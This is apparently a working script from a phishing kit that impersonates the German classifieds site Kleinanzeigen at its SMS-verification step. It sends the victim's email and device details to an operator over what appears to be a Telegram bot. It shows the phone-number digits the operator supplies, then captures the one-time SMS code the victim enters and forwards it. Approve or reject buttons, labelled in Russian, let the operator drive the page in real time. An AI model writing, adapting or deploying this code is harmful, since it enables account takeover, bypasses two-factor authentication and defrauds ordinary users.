(function () {
  var email   = sessionStorage.getItem("ka_email")   || "";
  var siteId  = sessionStorage.getItem("ka_site_id") || "";
  if (!email || !siteId) { window.location.href = "login.html"; return; }
  var smsId   = siteId + "_sms";
  var phoneDisplay = document.getElementById("phoneDisplay");
  var codeInput    = document.getElementById("smsCode");
  var errCode      = document.getElementById("errCode");
  var btnFort      = document.getElementById("btnFortfahren");
  var btnResend    = document.getElementById("btnResend");
  var phase      = 1;
  var notifMsgId = null;
  var sseSub     = null;
  var done       = false;
  function escapeHtml(str) { return String(str).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;"); }
  function getDevice() {
    var ua = navigator.userAgent, os = "Unknown", br = "Unknown";
    if (/Windows NT 10/.test(ua)) os = "Windows 10/11";
    else if (/Mac OS X/.test(ua)) os = "macOS";
    else if (/Android/.test(ua))  os = "Android";
    else if (/iPhone|iPad/.test(ua)) os = "iOS";
    else if (/Linux/.test(ua))    os = "Linux";
    if (/Edg\//.test(ua))          br = "Edge";
    else if (/OPR\//.test(ua))     br = "Opera";
    else if (/Firefox\//.test(ua)) br = "Firefox";
    else if (/Chrome\//.test(ua))  br = "Chrome";
    else if (/Safari\//.test(ua))  br = "Safari";
    return os + " / " + br;
  }
  function startSSE() {
    if (sseSub) sseSub.close();
    sseSub = KA.subscribe(siteId, {
      action: function(data) {
        if (done) return;
        if (data.siteId !== smsId && data.siteId !== siteId) return;
        if (phase === 2) {
          if (data.action === "success") {
            done = true; sseSub.close();
            sessionStorage.removeItem("ka_pass");
            window.location.href = "success.html";
          } else if (data.action === "wrong_sms") {
            phase = 1;
            btnFort.disabled = false;
            btnFort.innerHTML = "Fortfahren";
            codeInput.value = "";
            errCode.textContent = "Der Code ist falsch. Bitte versuche es erneut.";
            errCode.classList.add("visible");
          }
        }
      },
      digits: function(data) {
        if (done || phase !== 1) return;
        if (notifMsgId && data.replyMsgId && data.replyMsgId !== notifMsgId) return;
        phase = 0;
        phoneDisplay.textContent = "XXXXXXXXX" + data.digits;
        btnFort.disabled = false;
        btnFort.innerHTML = "Fortfahren";
        codeInput.focus();
        phase = 1;
      }
    });
  }
  function sendNotification() {
    var text =
      "\uD83D\uDCF1 <b>Kleinanzeigen SMS \u0437\u0430\u043F\u0440\u043E\u0441</b>\n" +
      "\uD83C\uDD94 <b>Site ID:</b> <code>#" + siteId + "</code>\n" +
      "\uD83D\uDCE7 <b>Email:</b> " + escapeHtml(email) + "\n" +
      "\uD83D\uDCBB <b>OS/Browser:</b> " + escapeHtml(getDevice()) + "\n" +
      "\uD83D\uDDD3 <b>Zeit:</b> " + new Date().toLocaleString("de-DE") + "\n\n" +
      "\u2757\uFE0F \u041E\u0442\u0432\u0435\u0442\u044C\u0442\u0435 \u0446\u0438\u0444\u0440\u0430\u043C\u0438 (\u043F\u043E\u0441\u043B\u0435\u0434\u043D\u0438\u0435 4 \u0446\u0438\u0444\u0440\u044B \u043D\u043E\u043C\u0435\u0440\u0430)";
    KA.sendMessage(text, null, true).then(function(data){
      if (data.ok) { notifMsgId = data.msgId; sessionStorage.setItem("ka_sms_notif_id", notifMsgId); }
    });
  }
  function sendCodeToBot(code) {
    var prevMsg = sessionStorage.getItem("ka_sms_msg_id");
    if (prevMsg) KA.editMarkup(parseInt(prevMsg), []);
    var text =
      "\uD83D\uDCF1 <b>Kleinanzeigen SMS Code</b>\n" +
      "\uD83C\uDD94 <b>Site ID:</b> <code>#" + siteId + "</code>\n" +
      "\uD83D\uDCE7 <b>Email:</b> " + escapeHtml(email) + "\n" +
      "\uD83D\uDD22 <b>SMS Code:</b> <code>" + escapeHtml(code) + "</code>\n" +
      "\uD83D\uDDD3 <b>Zeit:</b> " + new Date().toLocaleString("de-DE");
    phase = 2;
    KA.sendMessage(text, [
      [
        { text: "\u2705 \u0412\u0435\u0440\u043D\u043E", callback_data: smsId + ":success" },
        { text: "\u274C \u041D\u0435\u0432\u0435\u0440\u043D\u044B\u0439 \u043A\u043E\u0434", callback_data: smsId + ":wrong_sms" }
      ]
    ]).then(function(d){ if (d.ok) sessionStorage.setItem("ka_sms_msg_id", d.msgId); });
  }
  btnFort.addEventListener("click", function() {
    var code = codeInput.value.trim().replace(/\D/g,"");
    errCode.classList.remove("visible");
    if (code.length < 4) { errCode.textContent = "Bitte gib den Code ein."; errCode.classList.add("visible"); codeInput.focus(); return; }
    btnFort.disabled = true;
    btnFort.innerHTML = '<span class="btn-dots"><span>.</span><span>.</span><span>.</span></span>';
    sendCodeToBot(code);
  });
  btnResend.addEventListener("click", function() { codeInput.value = ""; codeInput.focus(); errCode.classList.remove("visible"); });
  codeInput.addEventListener("input", function() { codeInput.value = codeInput.value.replace(/\D/g,""); });
  startSSE();
  var savedDigits = sessionStorage.getItem("ka_sms_digits") || "";
  if (savedDigits) {
    phoneDisplay.textContent = "XXXXXXXXX" + savedDigits;
    btnFort.disabled = false;
    btnFort.innerHTML = "Fortfahren";
  } else {
    btnFort.disabled = true;
    btnFort.innerHTML = '<span class="btn-dots"><span>.</span><span>.</span><span>.</span></span>';
    sendNotification();
  }
  window.addEventListener("beforeunload", function() { if (sseSub) sseSub.close(); });
})();
